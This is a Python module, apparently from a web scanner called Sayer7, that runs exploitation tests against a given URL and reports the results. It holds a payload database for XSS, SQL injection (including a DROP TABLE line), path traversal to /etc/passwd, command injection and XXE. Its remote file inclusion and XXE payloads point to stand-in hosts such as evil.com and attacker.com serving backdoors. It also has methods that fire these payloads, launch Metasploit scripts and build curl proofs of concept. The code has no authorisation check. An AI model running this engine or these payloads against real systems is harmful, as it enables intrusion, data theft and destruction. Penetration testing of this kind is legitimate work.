#!/usr/bin/env python3
"""
Sayer7 Exploitation Engine
Advanced exploitation testing module with Metasploit integration
Author: Sayer7 Team
License: MIT
"""

import subprocess
import json
import requests
import socket
import time
import os
import re
from urllib.parse import urlparse, urljoin
import xml.etree.ElementTree as ET
from typing import Dict, List, Any, Optional

class ExploitationEngine:
    """
    Advanced exploitation testing engine for verifying vulnerability exploitability
    Supports Metasploit integration, automated payload testing, and proof-of-concept generation
    """
    
    def __init__(self, target_url: str, proxy_manager=None):
        """
        Initialize exploitation engine
        
        Args:
            target_url (str): Target URL for exploitation testing
            proxy_manager: Proxy manager instance for routing requests
        """
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.proxy_manager = proxy_manager
        self.session = requests.Session()
        self.exploitation_results = []
        self.metasploit_available = self._check_metasploit()
        self.payloads_db = self._load_payloads()
        
    def _check_metasploit(self) -> bool:
        """Check if Metasploit framework is available"""
        try:
            result = subprocess.run(['msfconsole', '-v'], 
                                  capture_output=True, text=True, timeout=10)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load exploitation payloads database"""
        return {
            'xss': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS")',
                '"><script>alert("XSS")</script>',
                '<svg onload=alert("XSS")>',
                '\'<script>alert("XSS")</script>',
                '";alert("XSS");//',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>'
            ],
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT null,null,null--",
                "'; DROP TABLE users;--",
                "' OR 1=1#",
                "admin'--",
                "1' OR '1'='1",
                "' OR 'a'='a",
                "' OR 1=1/*",
                "' OR SLEEP(5)--"
            ],
            'lfi': [
                '../../../etc/passwd',
                '....//....//....//etc/passwd',
                '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                'php://filter/convert.base64-encode/resource=index.php',
                'file:///etc/passwd',
                '/etc/passwd%00',
                '..%2f..%2f..%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd',
                '....//....//....//....//etc/passwd',
                '/proc/self/environ'
            ],
            'rfi': [
                'http://evil.com/shell.txt',
                'http://attacker.com/backdoor.php',
                'ftp://evil.com/malware.exe',
                'https://malicious.com/payload.txt',
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
                'expect://id',
                'input://data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+'
            ],
            'command_injection': [
                '; cat /etc/passwd',
                '| whoami',
                '&& id',
                '`whoami`',
                '$(whoami)',
                '; systeminfo',
                '| net user',
                '&& ipconfig',
                '`cat /etc/passwd`',
                '$(cat /etc/passwd)'
            ],
            'xxe': [
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo/>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal.dtd">]><foo>&xxe;</foo>',
                '<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;'
            ]
        }
    
    def test_xss_exploitation(self, vulnerable_params: List[Dict]) -> List[Dict]:
        """Test XSS exploitation on discovered parameters"""
        results = []
        
        for param in vulnerable_params:
            if param.get('type') == 'xss':
                for payload in self.payloads_db['xss']:
                    try:
                        test_url = self._inject_payload(param, payload)
                        response = self.session.get(test_url, timeout=10)
                        
                        if payload in response.text:
                            result = {
                                'vulnerability': 'XSS',
                                'parameter': param.get('name'),
                                'payload': payload,
                                'url': test_url,
                                'exploitable': True,
                                'severity': 'High',
                                'proof': f"Payload reflected in response: {payload[:100]}...",
                                'recommendation': 'Implement input validation and output encoding'
                            }
                            results.append(result)
                    except Exception as e:
                        results.append({
                            'vulnerability': 'XSS',
                            'parameter': param.get('name'),
                            'payload': payload,
                            'error': str(e),
                            'exploitable': False
                        })
        
        return results
    
    def test_sqli_exploitation(self, vulnerable_params: List[Dict]) -> List[Dict]:
        """Test SQL injection exploitation"""
        results = []
        
        for param in vulnerable_params:
            if param.get('type') == 'sqli':
                for payload in self.payloads_db['sqli']:
                    try:
                        test_url = self._inject_payload(param, payload)
                        response = self.session.get(test_url, timeout=15)
                        
                        # Check for SQL error messages
                        sql_errors = [
                            'mysql_fetch_array', 'ORA-', 'Microsoft OLE DB Provider',
                            'PostgreSQL query failed', 'SQLServer JDBC Driver',
                            'SQLite3::SQLException', 'Warning: mysql_',
                            'supplied argument is not a valid MySQL result',
                            'PostgreSQL.*ERROR', 'Driver.*SQL.*Server'
                        ]
                        
                        exploitable = any(error.lower() in response.text.lower() 
                                        for error in sql_errors)
                        
                        if exploitable or response.elapsed.total_seconds() > 5:
                            result = {
                                'vulnerability': 'SQL Injection',
                                'parameter': param.get('name'),
                                'payload': payload,
                                'url': test_url,
                                'exploitable': True,
                                'severity': 'Critical',
                                'proof': 'SQL error or time-based detection triggered',
                                'recommendation': 'Use parameterized queries and input validation'
                            }
                            results.append(result)
                    except Exception as e:
                        results.append({
                            'vulnerability': 'SQL Injection',
                            'parameter': param.get('name'),
                            'payload': payload,
                            'error': str(e),
                            'exploitable': False
                        })
        
        return results
    
    def test_lfi_exploitation(self, vulnerable_params: List[Dict]) -> List[Dict]:
        """Test Local File Inclusion exploitation"""
        results = []
        
        for param in vulnerable_params:
            if param.get('type') == 'lfi':
                for payload in self.payloads_db['lfi']:
                    try:
                        test_url = self._inject_payload(param, payload)
                        response = self.session.get(test_url, timeout=10)
                        
                        # Check for file content disclosure
                        file_indicators = [
                            'root:x:', 'Administrator:', '[boot loader]', 
                            'Windows IP Configuration', 'DOCUMENT_ROOT',
                            'mysql_connect', 'DB_PASSWORD'
                        ]
                        
                        exploitable = any(indicator in response.text 
                                        for indicator in file_indicators)
                        
                        if exploitable:
                            result = {
                                'vulnerability': 'Local File Inclusion',
                                'parameter': param.get('name'),
                                'payload': payload,
                                'url': test_url,
                                'exploitable': True,
                                'severity': 'High',
                                'proof': 'File system content disclosed',
                                'recommendation': 'Implement proper file path validation'
                            }
                            results.append(result)
                    except Exception as e:
                        results.append({
                            'vulnerability': 'Local File Inclusion',
                            'parameter': param.get('name'),
                            'payload': payload,
                            'error': str(e),
                            'exploitable': False
                        })
        
        return results
    
    def test_command_injection(self, vulnerable_params: List[Dict]) -> List[Dict]:
        """Test command injection exploitation"""
        results = []
        
        for param in vulnerable_params:
            if param.get('type') == 'command_injection':
                for payload in self.payloads_db['command_injection']:
                    try:
                        test_url = self._inject_payload(param, payload)
                        response = self.session.get(test_url, timeout=10)
                        
                        # Check for command execution indicators
                        cmd_indicators = [
                            'uid=', 'gid=', 'groups=', 'root', 'Administrator',
                            'Windows IP Configuration', 'Linux', 'Ubuntu',
                            'whoami', 'id=', 'systeminfo'
                        ]
                        
                        exploitable = any(indicator.lower() in response.text.lower() 
                                        for indicator in cmd_indicators)
                        
                        if exploitable:
                            result = {
                                'vulnerability': 'Command Injection',
                                'parameter': param.get('name'),
                                'payload': payload,
                                'url': test_url,
                                'exploitable': True,
                                'severity': 'Critical',
                                'proof': 'Command execution output detected',
                                'recommendation': 'Implement input sanitization and use safe APIs'
                            }
                            results.append(result)
                    except Exception as e:
                        results.append({
                            'vulnerability': 'Command Injection',
                            'parameter': param.get('name'),
                            'payload': payload,
                            'error': str(e),
                            'exploitable': False
                        })
        
        return results
    
    def run_metasploit_exploit(self, vulnerability_data: Dict) -> Dict:
        """Run Metasploit exploit if available"""
        if not self.metasploit_available:
            return {'error': 'Metasploit framework not available'}
        
        results = {
            'metasploit_available': True,
            'exploits': []
        }
        
        try:
            # Create Metasploit resource script
            resource_script = self._create_metasploit_script(vulnerability_data)
            
            # Execute Metasploit with resource script
            cmd = ['msfconsole', '-q', '-r', resource_script]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                results['exploits'].append({
                    'status': 'completed',
                    'output': result.stdout,
                    'vulnerability': vulnerability_data.get('type')
                })
            else:
                results['exploits'].append({
                    'status': 'failed',
                    'error': result.stderr,
                    'vulnerability': vulnerability_data.get('type')
                })
                
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def _create_metasploit_script(self, vulnerability_data: Dict) -> str:
        """Create Metasploit resource script based on vulnerability type"""
        script_content = f"""
use auxiliary/scanner/http/http_version
set RHOSTS {self.parsed_url.hostname}
set RPORT {self.parsed_url.port or 80}
run

"""
        
        # Add specific exploits based on vulnerability type
        vuln_type = vulnerability_data.get('type', '').lower()
        
        if vuln_type == 'sqli':
            script_content += f"""
use auxiliary/scanner/http/sqlmap
set RHOSTS {self.parsed_url.hostname}
set RPORT {self.parsed_url.port or 80}
run

"""
        elif vuln_type == 'xss':
            script_content += f"""
use auxiliary/scanner/http/xss_scanner
set RHOSTS {self.parsed_url.hostname}
set RPORT {self.parsed_url.port or 80}
run

"""
        
        script_content += "exit\n"
        
        # Write script to temporary file
        script_path = f"/tmp/sayer7_metasploit_{int(time.time())}.rc"
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        return script_path
    
    def _inject_payload(self, param: Dict, payload: str) -> str:
        """Inject payload into parameter"""
        import urllib.parse
        
        param_name = param.get('name')
        base_url = param.get('url', self.target_url)
        
        # Parse URL and inject payload
        parsed = urlparse(base_url)
        query_params = urllib.parse.parse_qs(parsed.query)
        query_params[param_name] = [payload]
        
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        new_url = parsed._replace(query=new_query).geturl()
        
        return new_url
    
    def generate_exploitation_report(self, results: List[Dict]) -> Dict:
        """Generate comprehensive exploitation report"""
        report = {
            'target': self.target_url,
            'scan_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'summary': {
                'total_vulnerabilities': len(results),
                'exploitable_vulnerabilities': len([r for r in results if r.get('exploitable')]),
                'critical_vulnerabilities': len([r for r in results if r.get('severity') == 'Critical']),
                'high_vulnerabilities': len([r for r in results if r.get('severity') == 'High'])
            },
            'exploitation_results': results,
            'recommendations': self._generate_recommendations(results),
            'proof_of_concepts': self._generate_pocs(results)
        }
        
        return report
    
    def _generate_recommendations(self, results: List[Dict]) -> List[str]:
        """Generate security recommendations based on exploitation results"""
        recommendations = []
        
        for result in results:
            if result.get('exploitable'):
                vuln_type = result.get('vulnerability')
                if vuln_type == 'SQL Injection':
                    recommendations.append('Use parameterized queries and input validation')
                elif vuln_type == 'XSS':
                    recommendations.append('Implement output encoding and input sanitization')
                elif vuln_type == 'Local File Inclusion':
                    recommendations.append('Validate file paths and use allowlists')
                elif vuln_type == 'Command Injection':
                    recommendations.append('Use safe APIs and input sanitization')
        
        return list(set(recommendations))
    
    def _generate_pocs(self, results: List[Dict]) -> List[Dict]:
        """Generate proof of concepts for exploitable vulnerabilities"""
        pocs = []
        
        for result in results:
            if result.get('exploitable'):
                poc = {
                    'vulnerability': result.get('vulnerability'),
                    'parameter': result.get('parameter'),
                    'payload': result.get('payload'),
                    'url': result.get('url'),
                    'curl_command': self._generate_curl_command(result)
                }
                pocs.append(poc)
        
        return pocs
    
    def _generate_curl_command(self, result: Dict) -> str:
        """Generate curl command for proof of concept"""
        url = result.get('url', '')
        method = 'GET'  # Default to GET for simplicity
        
        curl_cmd = f"curl -X {method} '{url}'"
        
        # Add headers if needed
        curl_cmd += " -H 'User-Agent: Sayer7-Exploitation-Engine'"
        
        return curl_cmd
    
    def run_comprehensive_exploitation(self, vulnerability_data: List[Dict]) -> Dict:
        """Run comprehensive exploitation testing on all discovered vulnerabilities"""
        all_results = []
        
        # Group vulnerabilities by type
        xss_vulns = [v for v in vulnerability_data if v.get('type') == 'xss']
        sqli_vulns = [v for v in vulnerability_data if v.get('type') == 'sqli']
        lfi_vulns = [v for v in vulnerability_data if v.get('type') == 'lfi']
        cmd_vulns = [v for v in vulnerability_data if v.get('type') == 'command_injection']
        
        # Test each vulnerability type
        if xss_vulns:
            all_results.extend(self.test_xss_exploitation(xss_vulns))
        
        if sqli_vulns:
            all_results.extend(self.test_sqli_exploitation(sqli_vulns))
        
        if lfi_vulns:
            all_results.extend(self.test_lfi_exploitation(lfi_vulns))
        
        if cmd_vulns:
            all_results.extend(self.test_command_injection(cmd_vulns))
        
        # Run Metasploit if available
        if self.metasploit_available:
            for vuln in vulnerability_data:
                msf_result = self.run_metasploit_exploit(vuln)
                if 'exploits' in msf_result:
                    all_results.extend(msf_result['exploits'])
        
        # Generate final report
        report = self.generate_exploitation_report(all_results)
        
        return report